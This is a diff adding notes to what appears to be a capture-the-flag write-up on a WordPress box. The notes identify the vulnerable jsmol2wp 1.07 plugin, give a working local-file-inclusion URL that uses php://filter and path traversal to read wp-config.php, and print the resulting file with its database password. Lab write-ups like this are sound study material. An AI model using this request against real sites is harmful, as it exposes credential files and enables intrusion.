@@ -330,4 +330,47 @@ Interesting Finding(s):
 > [!note]
 > Okay found the attack surface to explore which is jsmol2wp version 1.07 and found a number of usernames. The vulns is cross-site scripting (XSS) & server-side request forgery (SSRF). Let's see which one gets us in.
 
+```
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the web site, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/documentation/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** Database username */
+define( 'DB_USER', 'wpuser' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
+
+/** Database hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+```
+
+> [!note]
+> From wpscan - it led me to this link https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/ which led me to a LFI exploit to get a DB password it seems: http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php as shown above.
 
